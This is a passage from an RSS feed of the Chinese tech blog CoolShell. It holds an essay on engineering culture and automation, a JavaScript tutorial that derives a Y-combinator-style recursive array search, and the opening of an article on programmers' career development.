<p>工程师天生是追求效率的。有人说认为程序员花大量的时间做自动化的工具，还不如人肉的效率高，比如，写自动化的脚本花5个小时，而重复做这件事200次只花3个小时。有这样的理解的人根本不懂工程。</p>
<p>一方面，这个工具可以共享重用，更多的人可以从中受益，这次我花5个小时开发这个工具，下次只用1小时改一下就可以用在别的地方，这是着眼于未来而不是眼下的成本。更重要的是，这是一种文化，一种提高效率的文化，他会鼓励和激发出更多的这样的事情发生。<strong>如果你因为一个程序员花大量的时间开发自动化的工具，而认为这个程序员没有效率，对之批评甚至惩罚的话，那么你就扼杀了提高效率的文化</strong>（关于效率，大家可以看看我的另一篇文章《<a href="https://coolshell.cn/articles/10217.html" target="_blank">关于加班和效率</a>》，你会真正了解什么是效率）</p>
<p><strong>人类之所以比别的动物聪明就是会使用和发明工具</strong>，而古语也有云：“工欲善其事，必先利其器”，看看美军的装备你就知道战争工具的好坏有多重要了，<strong>一个公司的强大之处在执行力，而执行力的强大之处在于你有什么样的支持工具。这些，已经不是工程师文化，而是人类发展的文化</strong>。</p>
<p>针对于工程师文化来说，尤其是软件工程，提升工程效率的具体表现如下：</p>
<ul>
<li>
<strong>简化</strong>。简化不是简陋，简单的东西通常意味着用户更好理解，也意味着更容易的维护和运维。就像阿里推行的“小而美”，就像乔布期推崇的“没有产品手册简单易用的产品”，就像Amazon推行的Working Backwards里说的那样，一个新的产品或功能，产品经理需要写三个文档：媒体公关文、用户手册、常见问题，三个文档总共加起来不超过两页A4纸，且不准用任何图片说明，目的就是为了让产品简化和容易使用。</li>
</ul>
<ul>
<li>
<strong>残酷无情的推行自动化</strong>。编写程序的最本质的目的就是自动化，看看人类发展史上自动化了多少东西。<strong>对于自动化来说，不仅仅只是消除人肉的重复劳动，更重要的是，很多事情人完全干不过机器。</strong>比如：加一台机器，程序在秒级就可以完成，而人是永远不可能达到这样的速度的，再比如：电商中用程序管理数量巨大的订单的自动化系统，加再多的人都完成的不可能像机器那样完成的又好又快。自动化需要大力开发提高生产力的工具，比如：持续集成，持续部署，自动化运维，基础自动化运维，甚至自动化的运营工具。（Amazon的软件工程中对自动化和简代相当迷恋）</li>
</ul>
<ul>
<li>
<strong>避免无效率的组织架构和无效率的管理</strong>。这体现在这些方面：1）扁平化的组织架构，2）努力用自动化工具取代支持型的工作，3）不超过10个人的全栈小团队，4）不按人员的技能分工而是按其负责的产品或功能分工（关于分工，请参看《<a href="https://coolshell.cn/articles/17295.html" target="_blank">让我们来谈谈分工</a>》），5）开会不是解决问题，开会是表决提案，6）通过产品的目标或信条Tenets来减少沟通和决策过程（Amazon里的每个部门，每个团队，每个产品都有自己的Tenets，这个Tenets标明了要什么不要什么，这样可以避免很多扯皮和难缠的trade-off的决择，比如：AWS的几个信条：运维是最高优级的——这意味着只要是会让运维变得复杂的需求都可能会工程团队被拒掉，Throughput &amp; Latency不能更差——这意味着，功能要为性能让路，因为性能变差了，用户就要买更多的资源）</li>
</ul>
<ul>
<li>
<strong>正确的组件抽象</strong>。抽象是简化的一部份，一方面，抽象意味着重用和通用，另一方面抽象意味着强大的扩展性，以适配各种可能性。最重要的是，抽象意味着技术能力的输出，无论是内部的其它团队还外部的团队。比如：Google的MapReduce/BigTable/ProtoBuffer，FaceBook的Thrift，还有Amazon内部的WebService框架Coral Service、处理日志监控的Timber，以及全线AWS产品都用到的Amazon Lock Framework（一个分布式锁框架）……</li>
</ul>
<ul>
<li>
<strong>开发高质量的产品</strong>。因为高质量的代码，不但可以容易的修改和维护，还可以因为少处理线上故障，从而有更多的时间去为未来做更多创造性的工作。这意味着需要有非常严谨的Design Review，Code Review，以及测试，关于Code Review，可以参看这篇文章《<a href="https://coolshell.cn/articles/11432.html" target="_blank">从Code Review 谈如何做技术</a>》，关于严谨的测试，可以参看这篇文章《<a href="https://coolshell.cn/articles/17381.html" target="_blank">如何做性能测试</a>》</li>
</ul>
<ul>
<li>
<strong>不断的提高标准以及招聘最好的人</strong>。取法其上，得乎其中，取法其中，得乎其下，取法其下，法不得也。如果一个公司或一个团队想变得越来越好，越来越强大的话，就必需要不断的提高自己的工作标准，提高工作标准意味着要不断地培养和招聘更好的人。在Amazon和Google的招聘官中都有一个叫Bar Rasier的人，这个人就是为了提高招聘标准而设立的。</li>
</ul>
<ul>
<li>
<strong>创建一个持续改善的文化</strong>。一个好的组织，一个好的团队，是需要不断反思前进的，这需要全体员工一起来的。微观层面上，在项目做完后需要有一个总结会分析项目中的得失，在故障出现后，需要有故障分析会，反思得失，在Amazon，严重的故障，需要写一个COE（Correction of Errors）的文档，其中有一节叫“Ask 5 Whys”，让你自己问自己至少5个为什么。在宏观层面，一个公司每年都应该做一定的工作数据分析或是员工调查，比如，是否招聘到了不错的人、工作的投入产出比，员工在哪些地方花时间了，等等，然后不断的用技术手段来改善。（Amazon每年的工程师员工调查表是我活那么大见过的最细最细的调查表了， 问题除了对公司、经理、文化的，还有从，日常工作、开发环境、持结集成，测试自动化、产品质量、软件架构、软件维护、线上问题处理、年度计划、数据仓库建设、通用工具投票……这个员工调查直接导致公司的对工程的投资方向）</li>
</ul>
<h4>
<span class="ez-toc-section" id="%E5%B7%A5%E7%A8%8B%E5%B8%88%E6%96%87%E5%8C%96%E5%A6%82%E4%BD%95%E8%90%BD%E5%9C%B0"></span>工程师文化如何落地<span class="ez-toc-section-end"></span>
</h4>
<p>如果你要让任何文化在公司内得到执行，你有下面几个手段可以选择：</p>
<ul>
<li>
<strong>通过政治手段：你需要把住三个地方——招聘、绩效考核 &amp; 升职</strong>。比如，你要落地工程师文化中的简化和自动化，那你你在招聘的时候，你需要把懂简化和喜欢自动化的人招进来，然后在绩效考核和升职的地方设置上一条硬性指标——你今年简化了什么？自动化了什么？如果没有，对不起不但不能升职，绩效可能还不达标。</li>
</ul>
<ul>
<li>
<strong>通过经济手段：让不做这事的成本 &gt; 要做这个的成本。</strong>然后，正常的人类都会选择成本低的方案。比如，如果你要推行Design/Code Review/UT以提高质量，你就把QA和OPS团队全挪到一边去，让Dev团队自己测试，自己负责，这样等这些Dev重复多次手动测试，处理多次线上的弱智故障，他们就会自然而然的写自动化测试和做Code Review了，而QA和OPS团队只是帮Dev你做工具罢了，而测试和运维的事全是你DEV的Ownership，出了故障也是Dev自己负责，于是，他们就会发现，不做Code Review和UT的成本远远大于做C Code Review/UT的成本，他们就会去做成本低的事的。</li>
</ul>
<p>最后，工程师文化要落地，还有几个小条件，</p>
<ul>
<li>
<strong>第一，团队要小，Ownership很重要，Eat Your Own Dog Food。</strong> 没有人帮你擦屁股，自己的屎自己吃，没有痛苦，不会产生想进步的动力。</li>
</ul>
<ul>
<li>
<strong>第二，热爱学习和尝试</strong>，学习尝试新的技术，开拓眼界，学习尝试新的思维方式，否则，呆在原地，原有的思维方式只会让你在原地打转转。</li>
</ul>
<ul>
<li>
<strong>第三，老板更多的相信技术而不是管理</strong>。相信技术会用技术来解决问题，相信管理，那就只会有制度、流程和价值观来解决问题。</li>
</ul>
<h4>
<span class="ez-toc-section" id="%E5%85%B6%E5%AE%83"></span>其它<span class="ez-toc-section-end"></span>
</h4>
<p>说了这么多，时代还在发展，不过，这是我这么多年经历或看到的工程师文化的东西了。最后吐几个槽——</p>
<p>对于996和加班这个事，对于工程师来说从来都不是问题，在解决技术问题或是创造的时候，工程师是个很自觉的群体，基本不需要有别人驱动，工程师是最乐意Work Hard的人了。我相信几乎所有走上编程这个职业的人来说，基本上都是兴趣所至，觉得编程很有趣，但却被各个公司996搞得对编程毫无兴趣。为什么，你们这些公司要向中国的教育学习呢？人家本来对这事有比较高的兴趣的，但就是要通过考试/KPI/996这些东西把人家的兴趣一点一点的磨灭掉，把人变成机器、奴隶、牲口，<strong>让人对学习和工作产生了厌倦和讨厌，会是你们这些管理者们所希望的？是不是只有把人变得不思进取了，你们才会管理？</strong>就像《<a href="https://coolshell.cn/articles/4951.html" target="_blank">软件开发中的两种管理方式</a>》中说的第一种人一样？</p>
<p>另外，我不知道，为什么我一说这些东西，就会有很多人（包括程序员自己）来和我说我是个理想主义者，这些已经不是什么理想了，已被很多成功的公司用了很多很多年了。只是你没有见到过罢了。还有的人说，因为中国的国情不同。这更让我费解了。这让我想到了当年大清朝派了一堆人出国考察后回来后，说外国的那套共和的东西不符合中国国情，最终也在历史的潮流中被淹没掉了。另外，什么叫“中国的国情不同”？中国有全世界数一数二的互联网用户，也有全世界数一数二的市场，不再是以前那个一穷二白的年代了，中国的国情到底有哪些不同呢？</p>
<p>我不知道各位工程师是为什么活的？但我觉得，<strong>我们选择了一个刺激的职业，也赶上了这个行业大发展的时代，我们不妨扪心自问一下，你是否愿意让自己的能力、青春和热情就这样被磨灭了？</strong></p>
<p>（全文完）</p>
<div style="margin-top: 15px; font-size: 11px;">
<p align="center"><strong>（转载本站文章请注明作者和出处 <a href="https://coolshell.cn/">酷 壳 – CoolShell</a> ，请勿用于任何商业用途）</strong></p>
</div>
 ]]></content>
<pubDate>2016-09-18T16:23:11+08:00</pubDate>
<guid>https://coolshell.cn/articles/17497.html</guid>
<author><![CDATA[ 陈皓 ]]></author>
</item>
<item>
<title><![CDATA[ 如何读懂并写出装逼的函数式代码 ]]></title>
<link>https://coolshell.cn/articles/17524.html</link>
<content><![CDATA[ 
<p><img alt="image placeholder" >今天在微博上看到了 有人<a href="https://weibo.com/1655747731/Ee4gU0qNn" target="_blank">分享了下面的这段函数式代码</a>，我把代码贴到下面，不过我对原来的代码略有改动，对于函数式的版本，咋一看，的确令人非常费解，仔细看一下，你可能就晕掉了，似乎完全就是天书，看上去非常装逼，哈哈。不过，我感觉解析那段函数式的代码可能会一个比较有趣过程，而且，我以前写过一篇《<a href="https://coolshell.cn/articles/10822.html" target="_blank">函数式编程</a>》的入门式的文章，正好可以用这个例子，再升华一下原来的那篇文章，顺便可以向大家更好的介绍很多基础知识，所以写下这篇文章。</p>
<div id="ez-toc-container" class="ez-toc-v2_0_17 counter-hierarchy counter-decimal ez-toc-grey">
<div class="ez-toc-title-container">
<p class="ez-toc-title">目录</p>
<span class="ez-toc-title-toggle"></span>
</div>
<nav><ul class="ez-toc-list ez-toc-list-level-1">
<li class="ez-toc-page-1 ez-toc-heading-level-4"><a class="ez-toc-link ez-toc-heading-1" href="#%E5%85%88%E7%9C%8B%E4%BB%A3%E7%A0%81" title="先看代码">先看代码</a></li>
<li class="ez-toc-page-1 ez-toc-heading-level-4"><a class="ez-toc-link ez-toc-heading-2" href="#Javascript%E7%9A%84%E7%AE%AD%E5%A4%B4%E5%87%BD%E6%95%B0" title="Javascript的箭头函数">Javascript的箭头函数</a></li>
<li class="ez-toc-page-1 ez-toc-heading-level-4"><a class="ez-toc-link ez-toc-heading-3" href="#%E5%8C%BF%E5%90%8D%E5%87%BD%E6%95%B0%E7%9A%84%E9%80%92%E5%BD%92" title="匿名函数的递归">匿名函数的递归</a></li>
<li class="ez-toc-page-1 ez-toc-heading-level-4"><a class="ez-toc-link ez-toc-heading-4" href="#%E5%8A%A8%E7%94%A8%E9%AB%98%E9%98%B6%E5%87%BD%E6%95%B0%E7%9A%84%E9%80%92%E5%BD%92" title="动用高阶函数的递归">动用高阶函数的递归</a></li>
<li class="ez-toc-page-1 ez-toc-heading-level-4"><a class="ez-toc-link ez-toc-heading-5" href="#%E5%9B%9E%E9%A1%BE%E4%B9%8B%E5%89%8D%E7%9A%84%E7%A8%8B%E5%BA%8F" title="回顾之前的程序">回顾之前的程序</a></li>
<li class="ez-toc-page-1 ez-toc-heading-level-4"><a class="ez-toc-link ez-toc-heading-6" href="#%E5%85%B6%E5%AE%83" title="其它">其它</a></li>
</ul></nav>
</div>
<h4>
<span class="ez-toc-section" id="%E5%85%88%E7%9C%8B%E4%BB%A3%E7%A0%81"></span>先看代码<span class="ez-toc-section-end"></span>
</h4>
<p>这个代码平淡无奇，就是从一个数组中找到一个数，O(n)的算法，找不到就返回 null。</p>
<p>下面是正常的 old-school 的方式。不用多说。</p>
<p></p>
<pre data-enlighter-language="js" class="EnlighterJSRAW">//正常的版本
function find (x, y) {
  for ( let i = 0; i &lt; x.length; i++ ) {
    if ( x[i] == y ) return i;
  }
  return null;
}

let arr = [0,1,2,3,4,5]
console.log(find(arr, 2))
console.log(find(arr, 8))</pre>
<p>结果到了函数式成了下面这个样子（好像上面的那些代码在下面若影若现，不过又有点不太一样，为了消掉if语言，让其看上去更像一个表达式，动用了 ? 号表达式）：</p>
<p></p>
<pre data-enlighter-language="js" class="EnlighterJSRAW">//函数式的版本
const find = ( f =&gt; f(f) ) ( f =&gt;
  (next =&gt; (x, y, i = 0) =&gt;
    ( i &gt;= x.length) ?  null :
      ( x[i] == y ) ? i :
        next(x, y, i+1))((...args) =&gt;
          (f(f))(...args)))

let arr = [0,1,2,3,4,5]
console.log(find(arr, 2))
console.log(find(arr, 8))</pre>
<p>为了讲清这个代码，需要先补充一些知识。</p>
<p><span id="more-17524"></span></p>
<h4>
<span class="ez-toc-section" id="Javascript%E7%9A%84%E7%AE%AD%E5%A4%B4%E5%87%BD%E6%95%B0"></span>Javascript的箭头函数<span class="ez-toc-section-end"></span>
</h4>
<p>首先先简单说明一下，ECMAScript2015 引入的箭头表达式。箭头函数其实都是匿名函数，其基本语法如下：</p>
<blockquote>
<p>
</p>
<pre data-enlighter-language="js" class="EnlighterJSRAW">(param1, param2, …, paramN) =&gt; { statements } 
(param1, param2, …, paramN) =&gt; expression
     // 等于 :  =&gt; { return expression; } 

// 只有一个参数时,括号才可以不加:
(singleParam) =&gt; { statements }
singleParam =&gt; { statements }

//如果没有参数,就一定要加括号:
() =&gt; { statements }</pre>
</blockquote>
<p>下面是一些示例：</p>
<p></p>
<pre data-enlighter-language="js" class="EnlighterJSRAW">var simple = a =&gt; a &gt; 15 ? 15 : a; 
simple(16); // 15
simple(10); // 10

let max = (a, b) =&gt; a &gt; b ? a : b;

// Easy array filtering, mapping, ...

var arr = [5, 6, 13, 0, 1, 18, 23];
var sum = arr.reduce((a, b) =&gt; a + b);  // 66
var even = arr.filter(v =&gt; v % 2 == 0); // [6, 0, 18]
var double = arr.map(v =&gt; v * 2);       // [10, 12, 26, 0, 2, 36, 46]</pre>
<p>看上去不复杂吧。不过，上面前两个 simple 和 max 的例子都把这箭头函数赋值给了一个变量，于是它就有了一个名字。有时候，某些函数在声明的时候就是调用的时候，尤其是函数式编程中，一个函数还对外返回函数的时候。比如下在这个例子：</p>
<p></p>
<pre data-enlighter-language="js" class="EnlighterJSRAW">function MakePowerFn(power) {
  return function PowerFn(base) {
    return Math.pow(base, power);
  } 
}

power3 = MakePowerFn(3); //制造一个X的3次方的函数
power2 = MakePowerFn(2); //制造一个X的2次方的函数

console.log(power3(10)); //10的3次方 = 1000
console.log(power2(10)); //10的2次方 = 100</pre>
<p>其实，在 MakePowerFn 函数里的那个 PowerFn 根本不需要命名，完全可以写成：</p>
<p></p>
<pre data-enlighter-language="js" class="EnlighterJSRAW">function MakePowerFn(power) {
  return function(base) {
    return Math.pow(base, power);
  } 
}</pre>
<p>如果用箭头函数，可以写成：</p>
<p></p>
<pre data-enlighter-language="js" class="EnlighterJSRAW">MakePowerFn = power  =&gt; {
  return base =&gt; {
    return Math.pow(base, power);
  } 
}</pre>
<p>我们还可以写得更简洁（如果用表达式的话，就不需要 { 和 }， 以及 return 语句 ）：</p>
<p><code data-enlighter-language="js" class="EnlighterJSRAW">MakePowerFn = power =&gt; base =&gt; Math.pow(base, power)</code></p>
<p>我还是加上括号，和换行可能会更清楚一些：</p>
<p></p>
<pre data-enlighter-language="js" class="EnlighterJSRAW">MakePowerFn = (power) =&gt; (
  (base) =&gt; (Math.pow(base, power))
)</pre>
<p>好了，有了上面的知识，我们就可以进入一个更高级的话题——匿名函数的递归。</p>
<h4>
<span class="ez-toc-section" id="%E5%8C%BF%E5%90%8D%E5%87%BD%E6%95%B0%E7%9A%84%E9%80%92%E5%BD%92"></span>匿名函数的递归<span class="ez-toc-section-end"></span>
</h4>
<p>函数式编程立志于用函数表达式消除有状态的函数，以及for/while循环，所以，在函数式编程的世界里是不应该用for/while循环的，而要改用递归（递归的性能很差，所以，一般是用尾递归来做优化，也就是把函数的计算的状态当成参数一层一层的往下传递，这样语言的编译器或解释器就不需要用函数栈来帮你保存函数的内部变量的状态了）。</p>
<p>好了，那么，匿名函数的递归该怎么做？</p>
<p>一般来说，递归的代码就是函数自己调用自己，比如我们求阶乘的代码：</p>
<p></p>
<pre data-enlighter-language="js" class="EnlighterJSRAW">function fact(n){
  return n==0 ? 1 :  n * fact(n-1);
};
result = fact(5);
</pre>
<p>在匿名函数下，这个递归该怎么写呢？对于匿名函数来说，<b>我们可以把匿名函数当成一个参数传给另外一个函数，因为函数的参数有名字，所以就可以调用自己了</b>。 如下所示：</p>
<p></p>
<pre data-enlighter-language="js" class="EnlighterJSRAW">function combinator(func) {
  func(func);
}</pre>
<p>这个是不是有点作弊的嫌疑？Anyway，我们再往下，把上面这个函数整成箭头函数式的匿名函数的样子。</p>
<p><code data-enlighter-language="js" class="EnlighterJSRAW">（func) =&gt; (func(func)) </code></p>
<p>现在你似乎就不像作弊了吧。把上面那个求阶乘的函数套进来是这个样子：</p>
<p>首先，先重构一下fact，把fact中自己调用自己的名字去掉：</p>
<p></p>
<pre data-enlighter-language="js" class="EnlighterJSRAW">function fact(func, n) {
  return n==0 ? 1 :  n * func(func, n-1);
}

fact(fact, 5); //输出120
</pre>
<p>然后，我们再把上面这个版本变成箭头函数的匿名函数版：</p>
<p></p>
<pre data-enlighter-language="js" class="EnlighterJSRAW">var fact = (func, n) =&gt; ( n==0 ? 1 :  n * func(func, n-1) )
fact(fact, 5)
</pre>
<p>这里，我们依然还要用一个fact来保存这个匿名函数，我们继续，我们要让匿名函数声明的时候，就自己调用自己。</p>
<p>也就是说，我们要把 </p>
<p><code data-enlighter-language="js" class="EnlighterJSRAW">(func, n) =&gt; ( n==0 ? 1 : n * func(func, n-1) )</code> </p>
<p>这个函数当成调用参数，传给下面这个函数：</p>
<p><code data-enlighter-language="js" class="EnlighterJSRAW">(func, x) =&gt; func(func, x) </code></p>
<p>最终我们得到下面的代码：</p>
<p></p>
<pre data-enlighter-language="js" class="EnlighterJSRAW"> 
( (func, x) =&gt; func(func, x) ) (  //函数体
  (func, n) =&gt; ( n==0 ? 1 :  n * func(func, n-1) ), //第一个调用参数
  5 //第二调用参数
); </pre>
<p>好像有点绕，anyway, 你看懂了吗？没事，我们继续。</p>
<h4>
<span class="ez-toc-section" id="%E5%8A%A8%E7%94%A8%E9%AB%98%E9%98%B6%E5%87%BD%E6%95%B0%E7%9A%84%E9%80%92%E5%BD%92"></span>动用高阶函数的递归<span class="ez-toc-section-end"></span>
</h4>
<p>但是上面这个递归的匿名函数在自己调用自己，所以，代码中有hard code的实参。我们想实参去掉，如何去掉呢？我们可以参考前面说过的那个 MakePowerFn 的例子，不过这回是递归版的高阶函数了。</p>
<p></p>
<pre data-enlighter-language="js" class="EnlighterJSRAW">HighOrderFact = function(func){
  return function(n){
    return n==0 ? 1 : n * func(func)(n-1);
  };
};</pre>
<p>我们可以看，上面的代码简单说来就是，<b>需要一个函数做参数，然后返回这个函数的递归版本</b>。那么，我们怎么调用呢？</p>
<p></p>
<pre data-enlighter-language="js" class="EnlighterJSRAW">fact = HighOrderFact(HighOrderFact);
fact(5); </pre>
<p>连起来写就是：<br>
<code data-enlighter-language="js" class="EnlighterJSRAW">HighOrderFact ( HighOrderFact ) ( 5 )</code></p>
<p>但是，这样让用户来调用很不爽，所以，以我们一个函数把 <b> HighOrderFact ( HighOrderFact ) </b> 给代理一下：<br>
</p>
<pre data-enlighter-language="js" class="EnlighterJSRAW">fact = function ( hifunc ) {
  return hifunc ( hifunc );
} (
  //调用参数是一个函数
  function (func) { 
    return function(n){
      return n==0 ? 1 : n * func(func)(n-1);
    };
  }
);

fact(5); //于是我们就可以直接使用了</pre>
<p>用箭头函数重构一下，是不是简洁了一些？</p>
<p></p>
<pre data-enlighter-language="js" class="EnlighterJSRAW">fact = (highfunc =&gt; highfunc ( highfunc ) ) (
  func =&gt; n =&gt;  n==0 ? 1 : n * func(func)(n-1)
);</pre>
<p>上面就是我们最终版的阶乘的函数式代码。</p>
<h4>
<span class="ez-toc-section" id="%E5%9B%9E%E9%A1%BE%E4%B9%8B%E5%89%8D%E7%9A%84%E7%A8%8B%E5%BA%8F"></span>回顾之前的程序<span class="ez-toc-section-end"></span>
</h4>
<p>我们再来看那个查找数组的正常程序：</p>
<p></p>
<pre data-enlighter-language="js" class="EnlighterJSRAW">//正常的版本
function find (x, y) {
  for ( let i = 0; i &lt; x.length; i++ ) {
    if ( x[i] == y ) return i;
  }
  return null;
}</pre>
<p>先把for干掉，搞成递归版本：</p>
<p></p>
<pre data-enlighter-language="js" class="EnlighterJSRAW">function find (x, y, i=0) {
  if ( i &gt;= x.length ) return null;
  if ( x[i] == y ) return i;
  return find(x, y, i+1);
}</pre>
<p>然后，写出带实参的匿名函数的版本（注：其中的if代码被重构成了 ？号表达式）：</p>
<p></p>
<pre data-enlighter-language="js" class="EnlighterJSRAW">( (func, x, y, i) =&gt; func(func, x, y, i) ) (  //函数体
  (func, x, y, i=0) =&gt; (
      i &gt;= x.length ?  null :
         x[i] == y  ?  i : func (func, x, y, i+1)
  ), //第一个调用参数
  arr, //第二调用参数
  2 //第三调用参数
)</pre>
<p>最后，引入高阶函数，去除实参：</p>
<p></p>
<pre data-enlighter-language="js" class="EnlighterJSRAW">const find = ( highfunc =&gt; highfunc( highfunc ) ) (
   func =&gt; (x, y, i = 0) =&gt; (
     i &gt;= x.length ?  null :
           x[i] == y  ?  i : func (func) (x, y, i+1)
   )
);</pre>
<p>注：函数式编程装逼时一定要用const字符，这表示我写的函数里的状态是 immutable 的，天生骄傲！</p>
<p>再注：我写的这个比原来版的那个简单了很多，原来版本的那个又在函数中套了一套 next， 而且还动用了不定参数，当然，如果你想装逼装到天上的，理论上来说，你可以套N层，呵呵。</p>
<p><b>现在，你可以体会到，如此逼装的是怎么来的了吧？</b>。</p>
<h4>
<span class="ez-toc-section" id="%E5%85%B6%E5%AE%83"></span>其它<span class="ez-toc-section-end"></span>
</h4>
<p>你还别说这就是装逼，简单来说，我们可以使用数学的方式来完成对复杂问题的描述，那怕是递归。其实，这并不是新鲜的东西，这是Alonzo Church 和 Haskell Curry 上世纪30年代提出来的东西，这个就是 Y Combinator 的玩法，关于这个东西，你可以看看下面两篇文章：</p>
<p>《<a href="https://mvanier.livejournal.com/2897.html" target="_blank">The Y Combinator (Slight Return)</a>》，</p>
<p>《<a href="https://en.wikipedia.org/wiki/Fixed-point_combinator" target="_blank">Wikipedia: Fixed-point combinator</a>》</p>
<p>（全文完）</p>
<p></p>
<div style="margin-top: 15px; font-size: 11px;">
<p align="center"><strong>（转载本站文章请注明作者和出处 <a href="https://coolshell.cn/">酷 壳 – CoolShell</a> ，请勿用于任何商业用途）</strong></p>
</div>
 ]]></content>
<pubDate>2016-10-23T17:56:29+08:00</pubDate>
<guid>https://coolshell.cn/articles/17524.html</guid>
<author><![CDATA[ 陈皓 ]]></author>
</item>
<item>
<title><![CDATA[ 技术人员的发展之路 ]]></title>
<link>https://coolshell.cn/articles/17583.html</link>
<content><![CDATA[ 
<p><img alt="image placeholder" >2012年的时候写过一篇叫《<a href="https://coolshell.cn/articles/8790.html" target="_blank">程序算法与人生选择</a>》的文章，我用算法来类比如何做选择，说白了就是怎么去计算，但是并没有讲程序员可以发展的方向有哪些。 所以，就算是有这些所谓的方法论，我们可能对自己的发展还是会很纠结和无所事从，尤其是人到了30岁，这种彷徨和迷惑越来越重。虽然我之前也写过一篇《<a href="https://coolshell.cn/articles/10688.html" target="_blank">编程年龄和编程技能</a>》的文章，但是还是有很多做技术的人对于自己能否在年纪大时还能去做技术感到没有信心。我猜测，这其中，最大的问题的是，目前从事技术工作的种种负面的经历（比如经常性的加班，被当成棋子或劳动力等等），让人完全看不到希望和前途，尤其是随着年纪越来越大，对未来的越来越没有信心。</p>
<p>同时，也是因为在GIAC的大会被问到，程序员老了怎么办？而在年底这段时间，也和几个朋友在交流中不断地重复谈到个人发展的这个话题。我的人生过半，活到“不惑”的年纪，自然经常性的对什么事都会回头看看总结归纳，所以，在交谈过程中和交谈过后，自己也有一些思考想记录下来。因为我本人也是在这条路上的人，所以，谈不上给他人指导，我同样也是在瞎乱折腾同样每天在思考自己要去哪儿的“一尘世间迷途老生”。况且，我的经历和眼界非常有限，因此，下面的这些关于个人发展的文字和思考必然是受我的眼界和经历所局限的。也欢迎大家补充和指正。</p>
<p>这些东西不一定对，也不一定就是全部，期许可以让你在年底的时候有所思考，在明年的时候有所计划。</p>
<div id="ez-toc-container" class="ez-toc-v2_0_17 counter-hierarchy counter-decimal ez-toc-grey">
<div class="ez-toc-title-container">
<p class="ez-toc-title">目录</p>
<span class="ez-toc-title-toggle"></span>
</div>
<nav><ul class="ez-toc-list ez-toc-list-level-1">
<li class="ez-toc-page-1 ez-toc-heading-level-4"><a class="ez-toc-link ez-toc-heading-1" href="#%E4%B8%80%E4%B8%AA%E9%87%8D%E8%A6%81%E9%98%B6%E6%AE%B5%E5%92%8C%E6%A0%87%E5%BF%97" title="一个重要阶段和标志">一个重要阶段和标志</a></li>
<li class="ez-toc-page-1 ez-toc-heading-level-4"><a class="ez-toc-link ez-toc-heading-2" href="#%E4%B8%AA%E4%BA%BA%E5%8F%91%E5%B1%95%E7%9A%84%E4%B8%89%E4%B8%AA%E6%96%B9%E5%90%91" title="个人发展的三个方向">个人发展的三个方向</a></li>
<li class="ez-toc-page-1 ez-toc-heading-level-4">
<a class="ez-toc-link ez-toc-heading-3" href="#%E4%B8%80%E3%80%81%E5%9C%A8%E8%81%8C%E5%9C%BA%E4%B8%AD%E5%8F%91%E5%B1%95" title="一、在职场中发展">一、在职场中发展</a><ul class="ez-toc-list-level-5">
<li class="ez-toc-heading-level-5"><a class="ez-toc-link ez-toc-heading-4" href="#1%E3%80%81%E5%8E%BB%E9%A1%B6%E5%B0%96%E5%85%AC%E5%8F%B8" title="1、去顶尖公司">1、去顶尖公司</a></li>
<li class="ez-toc-page-1 ez-toc-heading-level-5"><a class="ez-toc-link ez-toc-heading-5" href="#2%E3%80%81%E5%8E%BB%E7%9C%9F%E6%AD%A3%E7%9A%84%E5%88%9B%E4%B8%9A%E5%85%AC%E5%8F%B8" title="2、去真正的创业公司">2、去真正的创业公司</a></li>
<li class="ez-toc-page-1 ez-toc-heading-level-5"><a class="ez-toc-link ez-toc-heading-6" href="#3%E3%80%81%E8%81%8C%E4%B8%9A%E7%94%9F%E6%B6%AF%E7%9A%84%E5%8F%91%E5%B1%95%E9%98%B6%E6%AE%B5" title="3、职业生涯的发展阶段">3、职业生涯的发展阶段</a></li>
</ul>
</li>
<li class="ez-toc-page-1 ez-toc-heading-level-4"><a class="ez-toc-link ez-toc-heading-7" href="#%E4%BA%8C%E3%80%81%E8%BF%BD%E6%B1%82%E4%BA%BA%E7%94%9F%E7%9A%84%E7%BB%8F%E5%8E%86" title="二、追求人生的经历">二、追求人生的经历</a></li>
<li class="ez-toc-page-1 ez-toc-heading-level-4"><a class="ez-toc-link ez-toc-heading-8" href="#%E4%B8%89%E3%80%81%E8%BF%BD%E6%B1%82%E8%87%AA%E7%94%B1%E7%9A%84%E7%94%9F%E6%B4%BB" title="三、追求自由的生活">三、追求自由的生活</a></li>
<li class="ez-toc-page-1 ez-toc-heading-level-4"><a class="ez-toc-link ez-toc-heading-9" href="#%E6%80%BB%E7%BB%93" title="总结">总结</a></li>
</ul></nav>
</div>
<h4>
<span class="ez-toc-section" id="%E4%B8%80%E4%B8%AA%E9%87%8D%E8%A6%81%E9%98%B6%E6%AE%B5%E5%92%8C%E6%A0%87%E5%BF%97"></span>一个重要阶段和标志<span class="ez-toc-section-end"></span>
</h4>
<p>在讲个人发展之前，我需要先说一下人生中的一个非常重要的阶段——<strong>20到30岁！</strong></p>
<p><strong>这个阶段的首要任务，就是提升自己学习能力和解决难题的能力。</strong><strong>这是一个非常非常关键的时间段！这个时间段几乎决定着你的未来。</strong></p>
<p><span id="more-17583"></span></p>
<p>30岁以前，这个时间段，应该是人学习和积累的时间段，这个时间段，就是努力学习的时间段。这个时间段，你一定要把时间花在解决问题的技能上。就是说，你一定要练就成的技能是——你能解决大多数人不能解决的问题。使蛮力埋头加班苦干，当一个搬砖老黄牛的是肯定没有前途的。如果你不幸呆在了一个搬砖的地方，天天被业务压得喘不过气来，我建议你宁可让你的项目延期被老板骂，也要把时间挤出来努力学习基础知识，多掌握一些技术（很多技术在思路上是相通的），然后才能有机会改变自己目前的状况。因为，比起你的个人未来，项目延期被老板骂、绩效不好拿不到奖金，都不是什么事儿。</p>
<p>总结一下，你在30岁前，工作5-7年，你需要拥有：</p>
<ul>
<li>
<strong>高效的学习能力</strong>。这意味着——基础知识扎实、触类旁通、读英文文档不费劲、有寻找前沿知识的能力、能够看到问题和技术的本质、善于思辩、能独立思考。</li>
</ul>
<ul>
<li>
<strong>解决问题的能力</strong>。这意味着——你要高效的学习能力、见过很多的场景、犯过或是处理很多错误、能够防火而不是救火。</li>
</ul>
<p>如果你拥有这两个能力的现象是—— <strong>在团队或身边的人群中的显现出Leadership</strong>。</p>
<p>Leadership并不是当领导和经理，而是一种特征，这种特征有如下两个简单的表象：</p>
<ul>
<li>
<strong>帮人解问题</strong>。团队或身边中大多数人都在问：“这问题怎么办？”，而总是你能站出来告诉大家这事该怎么办？</li>
</ul>
<ul>
<li>
<strong>被人所依赖</strong>。团队或身边中大多数人在做比较关键的决定时，都会来找你咨询你的意见和想法。</li>
</ul>
<p>一但你在在30岁之间出现了Leadership这样的特征，那么，你会进入一个正循环的阶段：</p>
<ul>
